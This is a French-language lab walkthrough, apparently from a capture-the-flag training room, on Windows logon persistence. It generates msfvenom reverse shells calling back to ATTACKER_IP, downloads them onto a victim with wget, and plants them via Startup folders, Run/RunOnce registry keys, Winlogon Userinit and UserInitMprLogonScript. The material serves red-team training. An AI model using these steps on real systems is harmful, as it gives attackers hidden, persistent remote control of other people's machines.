Certaines actions effectuées par un utilisateur peuvent également être liées à l'exécution de charges utiles spécifiques à des fins de persistance. Les systèmes d'exploitation Windows présentent plusieurs façons de lier les charges utiles à des interactions particulières. Cette tâche examinera les moyens d'implanter des charges utiles qui seront exécutées lorsqu'un utilisateur se connectera au système.

Dossier de démarrage

Chaque utilisateur dispose d'un dossier dans `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`lequel vous pouvez placer les exécutables à exécuter chaque fois que l'utilisateur se connecte. Un attaquant peut obtenir la persistance simplement en y déposant une charge utile. Notez que chaque utilisateur n'exécutera que ce qui est disponible dans son dossier.

Si nous voulons forcer tous les utilisateurs à exécuter une charge utile lors de la connexion, nous pouvons utiliser le dossier ci-dessous `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` de la même manière.

Pour cette tâche, générons une charge utile de shell inversé à l'aide de msfvenom :

Boîte d'attaque

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

Nous copierons ensuite notre charge utile dans la machine victime. Vous pouvez générer un `http.server`avec Python3 et utiliser wget sur la machine victime pour extraire votre fichier :

|

Boîte d'attaque

```
user@AttackBox$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

 | ➜ |

PowerShell

```
PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
```

 |

Nous stockons ensuite la charge utile dans le `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`dossier pour récupérer un shell pour tout utilisateur se connectant à la machine.

Invite de commande

```
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Assurez-vous maintenant de vous déconnecter de votre session depuis le menu Démarrer (fermer la fenêtre RDP ne suffit pas car cela laisse votre session ouverte) :

![f0ba7fd44646d55c5505737642bdd96e](https://github.com/dsgsec/Red-Team/assets/82456829/d01ddbd9-1ceb-4698-a233-ff84722d8513)


Et reconnectez-vous via RDP . Vous devriez immédiatement recevoir une connexion vers la machine de votre attaquant.


Exécuter/ExécuterUne fois

Vous pouvez également forcer un utilisateur à exécuter un programme lors de sa connexion via le registre. Au lieu de transmettre votre charge utile dans un répertoire spécifique, vous pouvez utiliser les entrées de registre suivantes pour spécifier les applications à exécuter lors de la connexion :

-   `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

Les entrées de registre ci-dessous `HKCU`s'appliqueront uniquement à l'utilisateur actuel et celles ci-dessous `HKLM`s'appliqueront à tout le monde. Tout programme spécifié sous les `Run`clés s'exécutera à chaque fois que l'utilisateur se connectera. Les programmes spécifiés sous les `RunOnce`touches ne seront exécutés qu'une seule fois.

Pour cette tâche, créons un nouveau shell inversé avec msfvenom :

Boîte d'attaque

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

Après l'avoir transféré sur la machine victime, déplaçons-le vers`C:\Windows\` :

Invite de commande

```
C:\> move revshell.exe C:\Windows
```

Créons ensuite une `REG_EXPAND_SZ`entrée de registre sous `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. Le nom de l'entrée peut être celui que vous voulez et la valeur sera la commande que nous voulons exécuter.

Remarque : Dans une configuration réelle, vous pouvez utiliser n'importe quel nom pour votre entrée de registre. Pour cette tâche, vous devez l'utiliser `MyBackdoor` pour recevoir l'indicateur.

![c99038cd6cc9e37512edabb1f873a4da](https://github.com/dsgsec/Red-Team/assets/82456829/528e465a-7b48-4e69-bd80-dbe4d818dd90)

Après cela, déconnectez-vous de votre session en cours et reconnectez-vous, et vous devriez recevoir un shell (cela prendra probablement environ 10 à 20 secondes).


Connexion Win

Une autre alternative pour démarrer automatiquement les programmes lors de la connexion consiste à abuser de Winlogon, le composant Windows qui charge votre profil utilisateur juste après l'authentification (entre autres).

Winlogon utilise certaines clés de registre `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`qui pourraient être intéressantes pour gagner en persistance :

-   `Userinit`pointe vers `userinit.exe`, qui se charge de restaurer les préférences de votre profil utilisateur.
-   `shell`pointe vers le shell du système, qui est généralement `explorer.exe`.

![f3c2215af6e3f2d19313498fca62a9d4](https://github.com/dsgsec/Red-Team/assets/82456829/55ad8354-fcba-4088-9ece-56eef959dfe3)

Si nous remplaçons l'un des exécutables par un shell inversé, nous interromprions la séquence de connexion, ce qui n'est pas souhaité. Fait intéressant, vous pouvez ajouter des commandes séparées par une virgule et Winlogon les traitera toutes.

Commençons par créer un shell :

Boîte d'attaque

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

Nous allons transférer le shell sur notre machine victime comme nous l'avons fait précédemment. Nous pouvons ensuite copier le shell dans n'importe quel répertoire de notre choix. Dans ce cas, nous utiliserons `C:\Windows`:

Invite de commande

```
C:\> move revshell.exe C:\Windows
```

Nous modifions ensuite soit `shell`ou `Userinit`in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. Dans ce cas nous utiliserons `Userinit`, mais la procédure avec `shell`est la même.

Remarque : Bien que les deux `shell`puissent `Userinit`être utilisés pour obtenir de la persistance dans un scénario réel, pour obtenir le drapeau dans cette pièce, vous devrez utiliser `Userinit`.

![dc5fa3e75ff056f11e16c03373799f45](https://github.com/dsgsec/Red-Team/assets/82456829/47763079-57c0-470c-8bf9-92cfa3bf031d)

Après cela, déconnectez-vous de votre session en cours et reconnectez-vous, et vous devriez recevoir un shell (cela prendra probablement environ 10 secondes).


Scripts de connexion

L'une des choses `userinit.exe`à faire lors du chargement de votre profil utilisateur est de rechercher une variable d'environnement appelée `UserInitMprLogonScript`. Nous pouvons utiliser cette variable d'environnement pour attribuer un script de connexion à un utilisateur qui sera exécuté lors de la connexion à la machine. La variable n'est pas définie par défaut, nous pouvons donc simplement la créer et attribuer le script de notre choix.

Notez que chaque utilisateur possède ses propres variables d'environnement ; par conséquent, vous devrez effectuer une porte dérobée séparément.

Créons d'abord un shell inversé à utiliser pour cette technique :

Boîte d'attaque

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

Nous allons transférer le shell sur notre machine victime comme nous l'avons fait précédemment. Nous pouvons ensuite copier le shell dans n'importe quel répertoire de notre choix. Dans ce cas, nous utiliserons `C:\Windows`:

Invite de commande

```
C:\> move revshell.exe C:\Windows
```

Pour créer une variable d'environnement pour un utilisateur, vous pouvez accéder à celle-ci `HKCU\Environment`dans le registre. Nous utiliserons l' `UserInitMprLogonScript`entrée pour pointer vers notre charge utile afin qu'elle soit chargée lorsque les utilisateurs se connecteront :

![9ce41ee1fc282b8dcacd757b23417b12](https://github.com/dsgsec/Red-Team/assets/82456829/5940e596-1e7a-4d47-9947-67b9a0f30f7d)

Notez que cette clé de registre n'a pas d'équivalent dans `HKLM`, ce qui fait que votre porte dérobée s'applique uniquement à l'utilisateur actuel.

Après cela, déconnectez-vous de votre session en cours et reconnectez-vous, et vous devriez recevoir un shell (cela prendra probablement environ 10 secondes).
